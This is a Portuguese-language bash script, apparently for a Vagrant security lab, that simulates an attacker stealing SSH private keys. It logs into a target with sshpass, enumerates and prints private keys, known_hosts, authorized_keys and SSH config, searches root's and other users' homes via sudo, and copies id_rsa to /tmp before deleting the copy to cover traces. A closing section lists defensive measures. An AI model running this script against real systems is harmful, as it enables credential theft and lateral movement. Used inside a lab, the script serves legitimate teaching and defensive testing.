#!/bin/bash

# Script de Ataque: Roubo de Chaves SSH Privadas
# Simula invasor que comprometeu sistema e busca chaves SSH para movimento lateral

echo "=========================================="
echo "  ATAQUE: ROUBO DE CHAVES SSH PRIVADAS"
echo "=========================================="
echo ""

TARGET=$1
USER=${2:-vagrant}
PASS=${3:-vagrant}

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <IP_ALVO> [usuario] [senha]"
    echo ""
    echo "Exemplo:"
    echo "  $0 192.168.56.10 vagrant vagrant"
    exit 1
fi

echo "[*] Alvo: $TARGET"
echo "[*] Usuário: $USER"
echo "[*] Iniciando busca por chaves SSH privadas..."
echo ""

# Fase 1: Reconhecimento de Diretórios SSH
echo "=========================================="
echo "FASE 1: RECONHECIMENTO DE DIRETÓRIOS SSH"
echo "=========================================="
echo ""

echo "[1.1] Verificando existência do diretório .ssh do usuário..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "ls -la ~/.ssh 2>&1" 2>/dev/null

echo ""
echo "[1.2] Verificando permissões do diretório .ssh..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "stat ~/.ssh 2>&1 | grep -E 'Access|Uid'" 2>/dev/null

echo ""
echo "[1.3] Listando todos os arquivos no .ssh..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "ls -lah ~/.ssh/ 2>&1" 2>/dev/null

echo ""
sleep 2

# Fase 2: Busca de Chaves Privadas em Locais Padrão
echo "=========================================="
echo "FASE 2: BUSCA DE CHAVES PRIVADAS"
echo "=========================================="
echo ""

echo "[2.1] Procurando chaves RSA privadas (id_rsa)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "test -f ~/.ssh/id_rsa && echo '✓ ENCONTRADA: ~/.ssh/id_rsa' || echo '✗ Não encontrada'" 2>/dev/null

echo ""
echo "[2.2] Procurando chaves DSA privadas (id_dsa)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "test -f ~/.ssh/id_dsa && echo '✓ ENCONTRADA: ~/.ssh/id_dsa' || echo '✗ Não encontrada'" 2>/dev/null

echo ""
echo "[2.3] Procurando chaves ECDSA privadas (id_ecdsa)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "test -f ~/.ssh/id_ecdsa && echo '✓ ENCONTRADA: ~/.ssh/id_ecdsa' || echo '✗ Não encontrada'" 2>/dev/null

echo ""
echo "[2.4] Procurando chaves ED25519 privadas (id_ed25519)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "test -f ~/.ssh/id_ed25519 && echo '✓ ENCONTRADA: ~/.ssh/id_ed25519' || echo '✗ Não encontrada'" 2>/dev/null

echo ""
echo "[2.5] Procurando chaves com nomes personalizados..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "find ~/.ssh -type f -name '*_rsa' -o -name '*_dsa' -o -name '*.pem' 2>/dev/null" 2>/dev/null

echo ""
sleep 2

# Fase 3: Verificação de Proteção das Chaves
echo "=========================================="
echo "FASE 3: VERIFICAÇÃO DE PROTEÇÃO"
echo "=========================================="
echo ""

echo "[3.1] Verificando permissões das chaves privadas..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "ls -l ~/.ssh/id_* 2>/dev/null | grep -v '.pub'" 2>/dev/null

echo ""
echo "[3.2] Verificando se chaves estão protegidas por senha..."
echo "[INFO] Chaves protegidas começam com: '-----BEGIN ENCRYPTED PRIVATE KEY-----'"
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "for key in ~/.ssh/id_rsa ~/.ssh/id_dsa ~/.ssh/id_ecdsa ~/.ssh/id_ed25519; do \
        if [ -f \$key ]; then \
            echo \"Verificando: \$key\"; \
            head -n 1 \$key 2>/dev/null; \
        fi; \
    done" 2>/dev/null

echo ""
echo "[3.3] Tentando ler conteúdo da chave privada (CRÍTICO)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "if [ -f ~/.ssh/id_rsa ]; then \
        echo '--- INÍCIO DA CHAVE PRIVADA id_rsa ---'; \
        cat ~/.ssh/id_rsa 2>&1 | head -10; \
        echo '...'; \
        echo '--- FIM (primeiras 10 linhas) ---'; \
    else \
        echo 'Chave id_rsa não encontrada'; \
    fi" 2>/dev/null

echo ""
sleep 2

# Fase 4: Análise de Destinos (known_hosts e authorized_keys)
echo "=========================================="
echo "FASE 4: ANÁLISE DE DESTINOS CONHECIDOS"
echo "=========================================="
echo ""

echo "[4.1] Lendo arquivo known_hosts (servidores acessados anteriormente)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "if [ -f ~/.ssh/known_hosts ]; then \
        echo 'Servidores conhecidos:'; \
        cat ~/.ssh/known_hosts 2>/dev/null | head -5; \
    else \
        echo 'Arquivo known_hosts não encontrado'; \
    fi" 2>/dev/null

echo ""
echo "[4.2] Lendo arquivo authorized_keys (quem pode acessar este servidor)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "if [ -f ~/.ssh/authorized_keys ]; then \
        echo 'Chaves autorizadas:'; \
        cat ~/.ssh/authorized_keys 2>/dev/null | wc -l | xargs echo 'Total de chaves autorizadas:'; \
        cat ~/.ssh/authorized_keys 2>/dev/null | head -2; \
    else \
        echo 'Arquivo authorized_keys não encontrado'; \
    fi" 2>/dev/null

echo ""
echo "[4.3] Procurando arquivos de configuração SSH..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "if [ -f ~/.ssh/config ]; then \
        echo '✓ ENCONTRADO: ~/.ssh/config'; \
        echo 'Hosts configurados:'; \
        cat ~/.ssh/config 2>/dev/null | grep -E '^Host |HostName|User|IdentityFile' | head -10; \
    else \
        echo '✗ Arquivo ~/.ssh/config não encontrado'; \
    fi" 2>/dev/null

echo ""
sleep 2

# Fase 5: Busca Avançada - Outras Localizações
echo "=========================================="
echo "FASE 5: BUSCA AVANÇADA EM OUTROS LOCAIS"
echo "=========================================="
echo ""

echo "[5.1] Procurando chaves em /root/.ssh (requer privilégios)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo ls -la /root/.ssh/ 2>&1 | head -10" 2>/dev/null

echo ""
echo "[5.2] Procurando chaves em /home de outros usuários..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo find /home -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' 2>/dev/null" 2>/dev/null

echo ""
echo "[5.3] Procurando chaves SSH em locais não-padrão..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "sudo find /tmp /var/tmp /opt -type f \( -name '*.pem' -o -name '*_rsa' \) 2>/dev/null | head -10" 2>/dev/null

echo ""
echo "[5.4] Procurando chaves em arquivos de backup..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "find ~ -name '*.bak' -o -name '*backup*' -o -name '*.old' 2>/dev/null | grep -i ssh" 2>/dev/null

echo ""
sleep 2

# Fase 6: Tentativa de Exfiltração
echo "=========================================="
echo "FASE 6: SIMULAÇÃO DE EXFILTRAÇÃO"
echo "=========================================="
echo ""

echo "[6.1] Tentando copiar chave privada para /tmp (prepara exfiltração)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "if [ -f ~/.ssh/id_rsa ]; then \
        cp ~/.ssh/id_rsa /tmp/stolen_key_$USER.pem 2>&1 && \
        echo '✓ Chave copiada para /tmp/stolen_key_$USER.pem' || \
        echo '✗ FALHOU: Não foi possível copiar chave'; \
    else \
        echo 'Nenhuma chave id_rsa para copiar'; \
    fi" 2>/dev/null

echo ""
echo "[6.2] Verificando se chave roubada é legível..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "if [ -f /tmp/stolen_key_$USER.pem ]; then \
        ls -lh /tmp/stolen_key_$USER.pem; \
        echo 'Primeiras linhas da chave roubada:'; \
        head -3 /tmp/stolen_key_$USER.pem; \
    fi" 2>/dev/null

echo ""
echo "[6.3] Limpando rastros (removendo arquivo temporário)..."
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    $USER@$TARGET "rm -f /tmp/stolen_key_$USER.pem 2>&1 && echo 'Rastros limpos' || echo 'Falha ao limpar'" 2>/dev/null

echo ""
sleep 1

# Fase 7: Resumo Final
echo "=========================================="
echo "  RESUMO DO ATAQUE"
echo "=========================================="
echo ""

echo "[*] Locais verificados:"
echo "    - ~/.ssh/id_rsa, id_dsa, id_ecdsa, id_ed25519"
echo "    - ~/.ssh/config (hosts VPS configurados)"
echo "    - ~/.ssh/known_hosts (histórico de conexões)"
echo "    - ~/.ssh/authorized_keys (chaves que acessam este servidor)"
echo "    - /root/.ssh (chaves do root)"
echo "    - /home/*/.ssh (chaves de outros usuários)"
echo "    - /tmp, /var/tmp, /opt (chaves em locais suspeitos)"
echo ""

echo "[!] IMPACTO DE SEGURANÇA:"
echo "    • Chave privada SEM senha = acesso imediato a VPS/servidores remotos"
echo "    • known_hosts revela IPs de servidores acessados (alvos secundários)"
echo "    • ~/.ssh/config contém usuários, IPs e caminhos de chaves de VPS"
echo "    • Movimento lateral: atacante pivota para AWS, DigitalOcean, etc."
echo ""

echo "[✓] PROTEÇÕES EFICAZES:"
echo "    1. Chaves SSH SEMPRE protegidas por senha forte"
echo "    2. Permissões corretas: chmod 600 id_rsa (somente dono lê)"
echo "    3. Não deixar chaves em /tmp, /var/tmp ou backups"
echo "    4. Usar ssh-agent com timeout curto"
echo "    5. Rotacionar chaves regularmente"
echo "    6. Logs de acesso SSH em servidor centralizado"
echo "    7. Fail2ban para detectar uso indevido de chaves"
echo ""

echo "=========================================="
echo "  ATAQUE CONCLUÍDO"
echo "=========================================="
echo ""
